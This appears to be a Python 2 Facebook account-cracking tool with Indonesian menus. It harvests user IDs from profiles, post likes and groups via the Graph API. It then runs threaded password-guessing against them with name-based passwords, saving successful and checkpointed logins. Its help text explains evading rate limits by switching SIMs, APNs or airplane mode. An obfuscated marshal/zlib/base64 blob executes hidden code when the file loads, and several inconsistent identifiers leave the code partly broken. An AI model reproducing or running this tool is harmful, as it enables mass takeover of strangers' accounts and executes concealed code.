...
try:
    ...
    viko_love_farhan ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Module requests belum terinstal")
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Module futures belum terinstall")
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Module bs4 belum terinstal")
    os.system('pip2 install bs4')
try:
    import ipaddress
except ImportError:
    viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Module ipaddress belum terinstal")
    os.system('pip2 install ipaddress')

import requests, os, re, bs4, sys, json, time, random, datetime, ipaddress
from concurrent.futures import ThreadPoolExecutor as vikoloveaycha
...
#    os.system('clear')
    ...
    if lalalalaganigani in ('menu', 'Menu', 'MENU'):
        ...
        viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Enter o arah e meng menu bosen boso indo ae")
        viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ararakimochi Mbah selamet ketampol panci...")
...
def ___jeeck___xnano___xxz___():
  #  os.system('git pull')
    ...
    print '\x1b[1;94m✠═║════════════════════════════════════════════════════✠\n';time.sleep(0.03)
    ___Viko___X___aycha___cans___ = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Menu : ")
    if ___Viko___X___aycha___cans___ == '':
        print ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar kawan");time.sleep(2);___jeeck___xnano___xxz___()
    elif ___Viko___X___aycha___cans___ in['2','02']:
        ___Vikl___lope___aycha___(lalalalaganigani)
    elif ___Viko___X___aycha___cans___ in['1','01']:
        ___Viko___sayang___aycha___publickkkk___(lalalalaganigani)
    elif ___Viko___X___aycha___cans___ in['3','03']:
        ___Viko___lope___aycha___canz___(lalalalaganigani)
    elif ___Viko___X___aycha___cans___ in['4','04']:
        ___Viko___sayang___aycha___postinganngentodbokep___(lalalalaganigani)
    elif ___Viko___X___aycha___cans___ in['11','11']:
        panduanxnano()
    elif ___Viko___X___aycha___cans___ in['12','12']:
        Viko_group()
    elif ___Viko___X___aycha___cans___ in['6','06']:
        ___Viko___run___().___aycha___cans___()
    elif ___Viko___X___aycha___cans___ in['5','05']:
        ___Viko___sayang___aycha___inpocook___(lalalalaganigani)
    elif ___Viko___X___aycha___cans___ in['10','10']:
       ___Viko___bukaksesi___()
    elif ___Viko___X___aycha___cans___ in['7','07']:
        try:
            ...
            Viko_love_aycha(" [%s*%s] Hasil %sCracking%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(B,P,B,P,K,O,hps_nm,B,P,O,len(total),O))
            print '\n\x1b[1;94m✠══════════════════════[ AYCHA CANZ ]══════════════════════✠\n';time.sleep(2)
            for aychaXviko in total:
            	lalalalaganigani = aychaXviko.replace("\n","")
            ...
            raw_input ( " \n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m[ ENTER ] ");___viko___xfarhan___xxz___()
        except (IOError):
            print ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Apakah lu dah Cracking kok nggak ada hasil")
            raw_inputt ( " \n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___viko___xfarhan___xxz___()
    elif ___viko___X___aycha___cans___ in['8','08']:
        seting_vikoxxz()
    elif ___viko___X___aycha___cans___ in['9','09']:
        ___viko___sayang___aycha___inpocookkkk___()
    elif ___viko___X___aycha___cans___ in['0','00']:
        print '\n'
        yanganz___()
        time.sleep(1);os.system('rm -rf .aychaXviko.txt')
        print ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  Berhasil ");exit()
    else:
        print '\n %s[%s+%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(B,P,B,P,___viko___X___aycha___cans___,N);time.sleep(2);___viko___xfarhan___xxz___()
...
def viko_group():
  ...
  print ("°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°")
  __viko__xxx__hu___ = raw_input ( " \n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Menu : ")
  if __viko__xxx__hu___ == '':
        print ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar kawan");time.sleep(2);___viko___xfarhan___xxz___()
  elif __viko__xxx__hu___ in['1','01']:
      os.system('xdg-open https://www.facebook.com/groups/319376899697354')
      ___viko___xfarhan___xxz___()
  elif __viko__xxx__hu___ in['2','02']:
      os.system('xdg-open https://www.facebook.com/groups/221877543390653')
      ___viko___xfarhan___xxz___()
  elif __viko__xxx__hu___ in['3','03']:
...
def ___viko___lope___aycha___(lalalalaganigani):
    try:
        os.mkdir('dump')
    except:pass
    try:
        ...
        ___viko___sayang___aycha___ = ('dump/' + jck + '.json').replace(' ', '_')
        jecko  = open(___viko___sayang___aycha___, 'w')
        ...
        jecko.close()
        viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Detected dump id maxs \033[0;00m100+\033[0;33m.........")
        ...
        os.remove(___viko___sayang___aycha___)
        jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Gagal dump id mungkin id tersebut privat")
        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___viko___xfarhan___xxz___()
'''
																																																				almr = '___viko___sayang___aycha___dy sayang Ya___viko___'
																																										'''

def ___viko___sayang___aycha___publickkkk___(lalalalaganigani):
    try:
        os.mkdir('dump')
    except:pass
    try:
        almr = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan id : ")
        aycha = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama file : ")
        ...
        os.remove(knt)
        viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Gagal dump id mungkin id perivat")
        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___viko___xfarhan___xxz___()
...
def ___viko___lope___aycha___canz___(lalalalaganigani):
    try:
        os.mkdir('dump')
    except:pass
    try:
        ...
        os.remove(almira)
        viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Dump id gagal mungkin id perivat")
        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___viko___xfarhan___xxz___()


def ___viko___sayang___aycha___postinganngentodbokep___(lalalalaganigani):
    try:
        os.mkdir('dump')
    except:pass
    try:
        ...
        jcko = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Maxs id : ")
        aycha = ('dump/' + ppk + '.json').replace(' ', '_')
        viko  = open(almirah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(ayc,vik,lalalalaganigani)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            jecko.write(a['id'] + '<=>' + a['name'] + '\n')
        ...
        jecko.close()
        viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Detected dump id maxs \033[0;00m100+\033[0;33m.........")
        viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Detected Dump like post")
        print ' [%s+%s] Tersimpan Di file ( %s%s%s )'%(B,P,B,almirah,N)
        print 50 * '═'
        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___viko___xfarhan___xxz___()
    except (KeyError,IOError):
        os.remove(almirah)
        viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Dump id gagal mungkin id privat")
        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___viko___xaycha___xxz___()


def ___viko___sayang___aycha___inpocook___(lalalalaganigani):
    try:
        user = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan Id : ")
        if user == '':
            viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan dengan benar bro");___viko___sayang___aycha___inpocook___(lalalalaganigani)
...
#    print '\033[0;36m✠═════════════════════════════════════════════════════✠\n';time.sleep(0.03)
    ...
    try:
    	___xxz___viko___ = x['id']
    except (KeyError, IOError):
    	___xxz___viko___ = '%s?%s'%(B,P)
    print ' [ >_ ] id facebook  : %s'%(___xxz___viko___);time.sleep(0.03)
    print ' %s[%s+%s]'%(B,P,B), 52 * '\x1b[1;96m=\x1b[0m'
    ...
    print ' %s[%s+%s]'%(B,P,B), 52 * '\x1b[1;96m=\x1b[0m'
    raw_input('\n  [ %sENTER%s ] '%(P,B));___viko___xfarhan___xxz___()




def ___viko___sayang___aycha___inpocookkkk___():
    
    viko_love_aycha("\n %s[%s•%s] AUTHOR :  "%(P,B,P))
    viko_love_aycha(" %s[%s•%s]          (1. Viko x Farhan "%(P,B,P))
    viko_love_aycha(" %s[%s•%s] TEAM PROJECT :  "%(P,B,P))
    viko_love_aycha(" %s[%s•%s]              (1. XNXCODE"%(P,B,P))
    viko_love_aycha(" %s[%s•%s]              (2. XXCODE "%(P,B,P))
    viko_love_aycha(" %s[%s•%s]              (3. YAYAN XD "%(P,B,P))
    viko_love_aycha(" %s[%s•%s]              (4. YUMASAA "%(P,B,P))
    viko_love_aycha(" %s[%s•%s]              (5. RISKY"%(P,B,P))
    viko_love_aycha(" %s[%s•%s] DONASI : [ VIKO ] "%(P,B,P))
    viko_love_aycha(" %s[%s•%s]        : 083870594381 "%(P,B,P))
    viko_love_aycha(" %s[%s•%s]        : 083870594381"%(P,B,P))
    viko_love_aycha(" [•] THANKS TO : ")
    viko_love_aycha(" %s[%s•%s]           : XNXCODE"%(P,B,P))
    viko_love_aycha(" %s[%s•%s]           : XXCODE"%(P,B,P))
    viko_love_aycha(" %s[%s•%s]           : RISKY / DUMAII"%(P,B,P))
    viko_love_aycha(" %s[%s•%s]           : YAYAN XD"%(P,B,P))
    viko_love_aycha(" %s[%s•%s]           : YUMASAA"%(P,B,P))
    viko_love_aycha(" %s[%s•%s]           : UDARA KARENA TANPA UDARA KITA AKAN MATI"%(P,B,P))
    viko_love_aycha(" [•] GITHUB KAWAN  : ")
    viko_love_aycha(" %s[%s•%s]           : YAYAN XD "%(P,B,P))
    viko_love_aycha(" %s[%s•%s]           ( https://github.com/Yayan-XD"%(P,B,P))
    viko_love_aycha(" %s[%s•%s]           : RISKY / DUMAII"%(P,B,P))
    viko_love_aycha(" %s[%s•%s]           ( https://github.com/Dumai-991"%(P,B,P))
    viko_love_aycha(" %s[%s•%s]           : YUMASAA"%(P,B,P))
    viko_love_aycha(" %s[%s•%s]           ( https://github.com/YumasaaTzy"%(P,B,P))
    viko_love_aycha(" %s[%s•%s]           ("%(P,B,P))
    viko_love_aycha(" %s[%s•%s]           NGGAK DI FOLLOW PECAH PALA KAU :V"%(P,B,P))
    raw_input('\n  [ %sENTER%s ] '%(P,B));___jeeck___xnano___xxz___()



def panduanxnano():
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m Menu Panduann Penggunaan")
         viko_love_aycha("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 1. Tools Ini Terdapat Beberapa Jenis Tools")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 2. Anda Dapat Memilih Salah Satu Menu Tools")
#         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 3. Tools Ini Terdapat Fitur Crcak Instagram")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 4. Dan Juga Ada Fitur Crack Facebook")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 5. Menu Crack Facebook Sangat Banyak Sekali Fitur")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 6. Dari Mulai Segi Dump Public Hingga Dump dump reactionts")
         viko_love_viko("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 7. Apa Itu Dump Id Public Bang...... ??")
         jeeck_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 8. Public Yang Ya Dumpublic Dump Id Orang Secara Random")
 #        viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 9. Dump Id group Maksudnya apa Bwank.....? Seriusnanya")
#         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 10. Kita Dumpnya Ambil Id Dari Group Dan Kita Dapat MENGOBOKOBOKOBOK RANDOM MEMBER GROUP")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 11. Bang Kalo Menu User Agent Fungsinya Buat Apa .....??")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 12. Kita Dapat Mengganti User-Agent Sesuai Kita  👀 Udah Tau Bang")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 13. Agent adalah proses mengakui dan menganalisis string agen pengguna untuk mengenali properti string.")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 14. 👀 Bang Kalo Ganti User Agent Itu Dapat One Tap Kahh")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 15. Belum Tentu Onetap ")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 16. Bang Cara Onetap Bagaimana SAYA MAU PAMER")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 17. 1.Dump Id Yang Temanya Sedaerah Dengan Lu")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 18. 2.Baca Bismillah Terlebih Dahulu")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 19. 3.Pada Saat Mau Buka Sesi Usahakan Anda Mempunyai 2 SIM")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 20. 4.Semisal Lu Pada Saat Crack Pake Sim1 Terus Lubuka Sesi Pake Sim 2")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 21. 5.Bang Masih Kagak Bisa ....??? .·´¯`(>▂<)´¯`·.")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 22. 6.Pake Methode Ganti Apn ")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 23. 7.Bang Apn Dapet Nya Darimana...???･ﾟﾟ･(>д<)･ﾟﾟ･")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 24. 8.Cari Di Google Banyak")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 25. 9.Bang Kegunaan Apn Untuk Apa")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 25. 10.fungsi APN adalah untuk menyambungkan device dengan operator penyedia layanan internet.")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 26. 11.Bang Lu Recode Ya NGGAK KO Hehehe ")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 27. 12.Bang Kok Methode Mbasic Kek Punya YayanXD ")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 28. 13.Oh Itu Emang Gwe Izin Ke YayanXD Ambil.Cuplikan Methode MBASIC")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 29. 14.Sama Aja Lu Recode Bwank ....? ENGGAK KOK HAL INI SAYA SEBUT KERJA SAMA")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 30. 15.Methode B-Api Yang Buat Sya , Mbasic Yang Buat YayanXD, Mobile FB Yang Buat RISKY/SUHU DUMAII")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 31. 16.Oooh Begitu Ya Bang.... Iyaa")
         viko_love_aycha("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 32. 17.Iyaa Bwank BTW MAKASIH UDAH PAKE TOOLS.SAYA")
         raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,P,B,p,))
         ___viko___xfarhan___xxz___()
def ___viko___bukaksesi___():
  ...
  raw_input('\n  %s[ %skembali%s ]'%(P,B,P));___vikk___xfarhan___xxz___()
...
def seting_vikoxxz():
    ...
    if ___janganlupafollowyaasu___ == '':
        print '\n %s[%s×%s] Gak boleh kosong anjink'%(P,B,P);time.sleep(2);seting_vikoxxz()
    elif ___janganlupafollowyaasu___ in['1','01']:
        _viko_ganteng_aycha_yangpunya_()
    elif ___janganlupafollowyaasu___ in['2','02']:
        try:
            user_agent = open('vikoxxz.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print '\n %s[%s+%s] User Agent anda : %s%s'%(P,B,P,H,user_agent)
        raw_input('\n  %s[ %skembali%s ]'%(P,B,P));___viko___xfarhan___xxz___()
    else:
        print '\n %s[%s×%s] input yang bener'%(P,B,P);time.sleep(2);seting_vikoxxz()

_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'lambda.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()

def _viko_ganteng_aycha_yangpunya_():
    os.system('rm -rf vikoxxz.txt')
    ____xxz___viko____ = raw_input('\n [%s?%s] %singin menggunakan user agent hp anda [Y/t]: '%(P,B,P))
    if ____xxz___viko____ == '':
        print '\n %s[%s×%s] Gak boleh kosong anjink'%(P,B,P);_jeeck_ganteng_almira_yangpunya_()
    elif ____xxz___viko____ in['Y','y']:
        ...
        _viko_xxzzyzzzz_aychadonk_ = raw_input(' [%s+%s] Masukan user agent hp anda :%s '%(P,B,H))
        open('jeeckxxz.txt', 'w').write(_jeeck_xxzzyzzzz_almiradonk_);time.sleep(2)
        viko_love_aycha('\n %s[%s+%s] berhasil menggunakan user agent hp anda...'%(P,B,P))
        raw_input('\n  %s[ %skembali%s ]'%(P,B,P));___viko___xfarhan___xxz___()
    elif ____xxz___viko____ in['T','t']:
        _viko_xxzzyzzzz_aychadonk_ = raw_input(' [%s?%s] Masukan user agent :%s '%(P,B,H))
        open('vikoxxz.txt', 'w').write(_viko_xxzzyzzzz_aychadonk_);time.sleep(2)
        viko_love_aycha('\n %s[%s+%s] berhasil mengganti user agent...'%(P,B,P))
        raw_input('\n  %s[ %skembali%s ]'%(P,B,P));___viko___xfarhan___xxz___()
    else:
        print '\n %s[%s!%s] Y/t anjink'%(P,B,P);_viko_ganteng_aycha_yangpunya_()

class ___viko___run___:
    ...
    def ___almira___cans___(self):
        try:
            ...
            raw_input( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___viko___xfarhan___xxz___()
        ___VikooloveAycha___ = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Sandi otomatis / manual [ O/m ] : ")
        if ___VikoloveAycha___ in ('m', 'M'):
            viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Example pass : vikogantenk/anjink/sayangku/freefire/")
            while True:
                ...
                if ___passxnxx___ == '':
                    viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Harap masukan dengan benar")
                elif len(___passxnxx___)<=5:
                    viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Maxsimum id 6 karakter ya cook")
                else:
                    def _____viko_____(jeckoc=None):
                        ___viko___sayang___aycha___ = raw_input ( "\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Crack : ")
                        if ___viko___sayang___aycha___ == '':
                            viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Di omongi ojo salah sengetik goblok");_____jeeck_____()()
                        elif ___viko___sayang___aycha___ == '1':
                            ...
                            with VikooloveAycha(max_workers=30) as (___viko___xxzy___):
                                for ___aycha___ in self.id:
                                    try:
                                        ___love___ = ___aycha___.split('<=>')[0]
                                        ___viko___xxzy___.submit(self.__viko__api__, ___love___, jeckoc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif ___viko___sayang___aycha___ == '2':
                            print '\n [%s+%s] hasil OK disimpan di : results/OK-%s-%s-%s.txt'%(B,P,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan di : results/CP-%s-%s-%s.txt'%(B,P,ha, op, ta)
                            print '\n [%s!%s] %sOn of mode pesawat saat 5 menit / jika tidak ada hasil....\n'%(P,B,P)
                            with VikooloveAycha(max_workers=30) as (___viko___xxzy___):
                                for ___aycha___ in self.id:
                                    try:
                                        ___love___ = ___aycha___.split('<=>')[0]
                                        ___viko___xxzy___.submit(self.__yayangantenk__, ___love___, jeckoc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif ___viko___sayang___aycha___ == '3':
                            print '\n [%s+%s] hasil OK disimpan di : results/OK-%s-%s-%s.txt'%(B,P,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan di : results/CP-%s-%s-%s.txt'%(B,P,ha, op, ta)
                            print '\n [%s!%s] %sOn of mode pesawat saat 5 menit / jika tidak ada hasil....\n'%(P,B,P) 
                            ...
                            with VikooloveAycha(max_workers=30) as (___viko___xxzy___):
                                for ___aycha___ in self.id:
                                    try:
                                        ___love___ = ___aycha___.split('<=>')[0]
                                        ___aycha___xxzy___.submit(self.__mfb,__, ___love___, jeckoc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print '\n %s[%s+%s] Wronk Input'%(P,B,P);_____viko_____()
#                    print '\n [ pilih method login - silalmirakan coba satu² ]\n'
                    ...
                    _____viko_____(___passxnxx___.split(','))
                    break
        elif ___VikooloveAycha___ in ('o', 'O'):
#            print '\n [ pilih method login - silalmirakan coba satu² ]\n'
            print ' %s[%s+%s] %s Menu Crack\n'%(B,P,B,P)
            print ' %s[%s1%s] %smethod API (fast)'%(B,P,B,P)
            print ' %s[%s2%s] %smethod Mbasic (sellow)'%(B,P,B,P)
            print ' %s[%s3%s] %smethod Mobile (sellow)'%(B,P,B,P)
            self._vikogantenggaksenenggakusahrecode_()
        else:
            print '\n %s[%s+%s] pilih [ O/m ] TOLOL goblok!'%(P,B,P);self.___aycha___cans___()
        return

    def __viko__api__(self, user, _____viko_____):
        global ok,cp,loop
#        sys.stdout.write('\r %s[%s+%s] %s[Cracking] %s/%s /\_/-> OK-:%s /\_/-> CP-:%s '%(B,P,B,P,loop,len(self.id),len(ok),len(cp))),
        ...
        sys.stdout.flush()
        for pw in _____viko_____:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_ganiganiganihujanbadaianginribut = open('vikoxxz.txt', 'r').read()
            except (KeyError, IOError):
    ...
    def __yayangantenk__(self, user, _____viko_____):
        global ok,cp,loop
        #sys.stdout.write('\r %s[%s+%s]%s [Cracking] %s/%s /\_/-> OK-:%s /\_/-> CP-:%s '%(B,P,B,P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.write('\r [%s*%s] [Cracking] %s/%s -> OK-:%s - CP-:%s '%(P,B,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    ...
    def __riskygantenk__(self, user, _____viko_____):
        global ok,cp,loop
        #sys.stdout.write('\r %s[%s+%s]%s [Cracking] %s/%s /\_/-> OK-:%s /\_/-> CP-:%s '%(B,P,B,P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.write('\r [%s*%s] [Cracking] %s/%s -> OK-:%s - CP-:%s '%(P,B,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    ...
    def vikogantenggaksenenggakusahrecode_(self):
        ___viko___ = raw_input('\n [ >_ ] method : ')
        if ___jeeck___ == '':
            print '\n %s[%s×%s] jangan kosong bro'%(P,B,P);self._vikogantenggaksenenggakusahrecode_()
        elif ___viko___ in ('1', '01'):
            ...
            with VikooloveAycha(max_workers=30) as (___viko___xxzy___):
            	for vikoxxz in self.id: 
                    try:
                        uid, name = vikoxxz.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        ___viko___xxzy___.submit(self.__viko__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif ___viko___ in ('2', '02'):
            print '\n [%s+%s] hasil OK disimpan di : results/OK-%s-%s-%s.txt'%(P,B,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan di : results/CP-%s-%s-%s.txt'%(P,B,ha, op, ta)
            print ' [%s!%s] On of mode pesawat saat 5 menit / jika tidak ada hasil....\n'%(P,B)
            with VikooloveAycha(max_workers=30) as (___viko___xxzy___):
            	for vikoxxz in self.id: 
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        ___viko___xxzy___.submit(self.__yayangantenk__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif ___viko___ in ('3', '03'):
            print '\n [%s+%s] hasil OK disimpan di : results/OK-%s-%s-%s.txt'%(P,B,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan di : results/CP-%s-%s-%s.txt'%(P,B,ha, op, ta)
            print ' [%s!%s] On of mode pesawat saat 5 menit / jika tidak ada hasil....\n'%(P,B)
            with JeckoloveAlmira(max_workers=30) as (___viko___xxzy___):
            	for vikoxxz in self.id: 
                    try:
                        uid, name = vikoxxz.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        ___viko___xxzy___.submit(self.__riskygantenk__, uid, pwx)
                    except:
                        pass
            ...
            viko_love_aycha ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Lebok no seng genah anjink");self._vikogantenggaksenenggakusahrecode_()
